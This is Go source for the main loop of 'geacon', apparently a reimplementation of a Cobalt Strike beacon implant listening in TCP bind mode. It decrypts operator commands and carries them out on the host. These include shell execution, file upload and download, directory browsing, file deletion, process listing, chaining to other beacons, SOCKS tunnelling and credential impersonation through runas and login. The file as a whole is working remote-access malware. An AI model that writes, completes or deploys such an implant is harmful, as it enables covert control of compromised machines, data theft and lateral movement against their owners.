package main

import (
	"bytes"
	"fmt"
	"geacon/cmd/config"
	"geacon/cmd/crypt"
	"geacon/cmd/packet"
	"geacon/cmd/util"
	"io"
	"os"
	"strings"
	"time"
	"net"
)

func main() {

	l, err := net.Listen("tcp", config.C2)
    if err != nil {
        fmt.Println("Error listening:", err.Error())
        os.Exit(1)
    } else {
		fmt.Println("Listening on %s", config.C2)
	}
    // Close the listener when the application closes
    defer l.Close()
	packet.InitialMetaInfo()
	// packet.encryptedMetaInfo = packet.EncryptedMetaInfo()
    for {
        // Listen for a single incoming connection at a time
        conn, err := l.Accept()
        if err != nil {
            fmt.Println("Error accepting: ", err.Error())
        } else {
			fmt.Println("Connection accepted: %s", conn)
		}
		packet.FirstBlood(conn)
		// Handle requests of the single connection we are listening for
		for {
			// handle linked beacons, same as with HTTP(S) geacons
			resultBuf := make([]byte, 0, 100000) // holds all beacon output, should be the maximum length of a HTTP body
			// handle requests from our parent beacon
			// first read 4 bytes, if the are 0x00000000, then we have nothing to do and answer with 0x000000, otherwise handle the request
			fmt.Printf("Attempting read\n")
			bufLenRaw := make([]byte, 4)
			_, err := conn.Read(bufLenRaw)
			if err != nil {
				fmt.Println("Error reading command length bytes: ", err.Error())
			}
			bufLen := packet.ReadLittleInt(bufLenRaw)
			fmt.Printf("Command length to expect: %d\n", bufLen)
			if bufLen == 0 {
				fmt.Printf("bufLen is equal to zero\nStill checking connected beacons")

				chainedResults := packet.CheckTcpBeacons()
				fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))

				socksResults := packet.CheckSocksOutput()
				chainedResults = append(chainedResults, socksResults...)
				fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
				if len(chainedResults) > 0 {
					fmt.Printf("chainedResults has length %d", len(chainedResults))
					resultBuf = append(resultBuf, chainedResults...)
					packet.PushResultTcp(conn, resultBuf)
				} else {
					fmt.Printf("Sending 4 bytes of zeros, nothing to do\n")
					conn.Write([]byte{00, 00, 00, 00})
					fmt.Printf("Beacon checked in!\n\n")
				}
			} else {
				fmt.Printf("bufLen is larger than zero, reading command buffer\n")
				buf := make([]byte, bufLen)
				// Read the incoming connection into the buffer.
				reqLen, err := conn.Read(buf)
				if err != nil {
					fmt.Println("Error reading:", err.Error())
					continue
				}
				if reqLen <= 0 {
					continue
				}
				fmt.Printf("READ %d BYTES\n", reqLen)

				chainedResults := packet.CheckTcpBeacons()
				fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))

				socksResults := packet.CheckSocksOutput()
				chainedResults = append(chainedResults, socksResults...)
				fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))

				buf = buf[:reqLen]
				if len(buf) > 0 {
					
					decrypted, hmacVerfied := packet.DecryptPacket(buf)

					if decrypted != nil {
						if hmacVerfied {
							timestamp := decrypted[:4]
							fmt.Printf("timestamp: %v\n", timestamp)
							lenBytes := decrypted[4:] // was [4:8]
							packetLen := packet.ReadInt(lenBytes)
							fmt.Printf("Packet length: %d\n", packetLen)

							decryptedBuf := bytes.NewBuffer(decrypted[8:])
							for {
								fmt.Printf("packetLen: %d\n", packetLen)
								if packetLen <= 0 {
									break
								}
								cmdType, cmdBuf := packet.ParsePacket(decryptedBuf, &packetLen)
								if cmdBuf != nil {
									fmt.Printf("cmdType is %d\n", cmdType)
									fmt.Printf("%x\n", cmdBuf)
									switch cmdType {
									//shell
									case packet.CMD_TYPE_SHELL:
										shellPath, shellBuf := packet.ParseCommandShell(cmdBuf)
										result := packet.Shell(shellPath, shellBuf)
										finalPacket := packet.MakePacket(0, result)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)

									case packet.CMD_TYPE_UPLOAD_START:
										filePath, fileData := packet.ParseCommandUpload(cmdBuf)
										filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
										packet.Upload(filePathStr, fileData)

									case packet.CMD_TYPE_UPLOAD_LOOP:
										filePath, fileData := packet.ParseCommandUpload(cmdBuf)
										filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
										packet.Upload(filePathStr, fileData)

									case packet.CMD_TYPE_DOWNLOAD:
										filePath := cmdBuf
										//TODO encode
										strFilePath := string(filePath)
										strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
										fileInfo, err := os.Stat(strFilePath)
										if err != nil {
											//TODO notify error to c2
											//packet.processError(err.Error())
											break
										}
										fileLen := fileInfo.Size()
										test := int(fileLen)
										fileLenBytes := packet.WriteInt(test)
										requestID := crypt.RandomInt(10000, 99999)
										requestIDBytes := packet.WriteInt(requestID)
										result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
										finalPacket := packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_START, result)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)

										fileHandle, err := os.Open(strFilePath)
										if err != nil {
											//packet.processErrorTest(err.Error())
											break
										}
										var fileContent []byte
										fileBuf := make([]byte, 512*1024)
										for {
											n, err := fileHandle.Read(fileBuf)
											if err != nil && err != io.EOF {
												break
											}
											if n == 0 {
												break
											}
											fileContent = fileBuf[:n]
											result = util.BytesCombine(requestIDBytes, fileContent)
											finalPacket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_WRITE, result)
											// packet.PushResult(finalPacket)
											resultBuf = append(resultBuf, finalPacket...)
										}

										finalPacket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_COMPLETE, requestIDBytes)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_FILE_BROWSE:
										dirResult := packet.File_Browse(cmdBuf)
										finalPacket := packet.MakePacket(packet.BEACON_RSP_FILE_BROWSE_RESULT, dirResult)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_CD:
										packet.ChangeCurrentDir(cmdBuf)
									case packet.CMD_TYPE_RM:
										packet.RemoveFile(cmdBuf)
									case packet.CMD_TYPE_DRIVES:
										driveResult := packet.ListDrives()
										finalPacket := packet.MakePacket(packet.BEACON_RSP_OUTPUT, driveResult)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_GETUID:
										getuidResult := packet.GetUid()
										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETUID, getuidResult)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_CP:
										// fmt.Printf("%x\n", cmdBuf)
										fromPath, toPath := packet.ParseCommandCopyMove(cmdBuf)
										packet.CopyFile(fromPath, toPath)
									case packet.CMD_TYPE_MV:
										fromPath, toPath := packet.ParseCommandCopyMove(cmdBuf)
										packet.MoveFile(fromPath, toPath)
									case packet.CMD_TYPE_SLEEP:
										sleep := packet.ReadInt(cmdBuf[:4])
										//jitter := packet.ReadInt(cmdBuf[4:8])
										fmt.Printf("Now sleep is %d ms\n",sleep)
										config.WaitTime = time.Duration(sleep) * time.Millisecond
									case packet.CMD_TYPE_PWD:
										pwdResult := packet.GetCurrentDirectory()
										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETCWD, pwdResult) // 32
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_LIST_PROCESS:
										processList := packet.ListProcesses()
										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_OUTPUT_PS, processList)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_CONNECT:
										target, port := packet.ParseCommandConnect(cmdBuf)
										fmt.Printf("Attempting to connect to TCP beacon on %s:%d\n", target, port)
										beaconId, encryptedMetaData := packet.ConnectTcpBeacon(target, port)
										if beaconId != -1 {
											result := util.BytesCombine(packet.WriteInt(beaconId), packet.WriteInt(beaconId), encryptedMetaData)
											// fmt.Printf("Result of beacon connect: %x\n", result)
											finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_LINK, result)
											// packet.PushResult(packet.EncryptPacket(finalPacket))
											resultBuf = append(resultBuf, finalPacket...)
										}
									case packet.CMD_TYPE_PIPE_FWD:
										beaconId, message := packet.ParsePipeForward(cmdBuf)
										fmt.Printf("Forwarding commands to tcp beacon %d", beaconId)
										_ = packet.SendLinkPacket(beaconId, message)
									case packet.CMD_TYPE_PWSH_IMPORT:
										// fmt.Printf("%x", cmdBuf)
										packet.SetShellPreLoadedFile(cmdBuf)
									case packet.CMD_TYPE_SOCKS_FWD:
										finalPacket := packet.ParseSocksInitTraffic(cmdBuf)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_SOCKS_SEND:
										packet.ParseSocksTraffic(cmdBuf)
									case packet.CMD_TYPE_SOCKS_DIE:
										packet.ParseSocksDie(cmdBuf)
									case packet.CMD_TYPE_LOGIN_USER:
										packet.ParseLoginUser(cmdBuf)
									case packet.CMD_TYPE_REVTOSELF:
										config.StoredCredentials = nil
									case packet.CMD_TYPE_RUNAS:
										result := packet.ParseRunAs(cmdBuf)
										finalPacket := packet.MakePacket(0, result)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_EXIT:
										os.Exit(0)
									default:

										errIdBytes := packet.WriteInt(0) // must be zero
										arg1Bytes := packet.WriteInt(0)  // for debug
										arg2Bytes := packet.WriteInt(0)
										errMsgBytes := []byte("The feature you are trying to use is not implemented yet.")
										result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
										finalPacket := packet.MakePacket(31, result)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)

									}
								} else {
									fmt.Printf("cmdBuf is empty!\n")
								}
							}
							fmt.Printf("DEBUG 1\n")
							if len(resultBuf) > 0 {
								fmt.Printf("DEBUG 2\n")
								resultBuf = append(resultBuf, chainedResults...)
								// send a consolidated output
								fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))

								fmt.Printf("Sending the following data:\n%x\n\n", resultBuf)

								packet.PushResultTcp(conn, resultBuf)
							} else {
								fmt.Printf("resultBuf is empty\n")
								fmt.Printf("Sending 4 bytes of zeros, nothing to do\n")
								conn.Write([]byte{00, 00, 00, 00})
							}
						} else {
							fmt.Printf("HMAC could not be verified. Ignoring command.\n\n")
						}
					} else {
						if len(chainedResults) > 0 {
							fmt.Printf("chainedResults has length %d", len(chainedResults))
							resultBuf = append(resultBuf, chainedResults...)
							packet.PushResultTcp(conn, resultBuf)
						} else {
							fmt.Printf("Sending 4 bytes of zeros, nothing to do\n")
							conn.Write([]byte{00, 00, 00, 00})
							fmt.Printf("Beacon checked in!\n\n")
						}
					}
				}
			}
			fmt.Printf("here we go again \n\n")
			// fmt.Printf("Sleeping...\n\n")

			// time.Sleep(config.WaitTime)
		}
    }

}
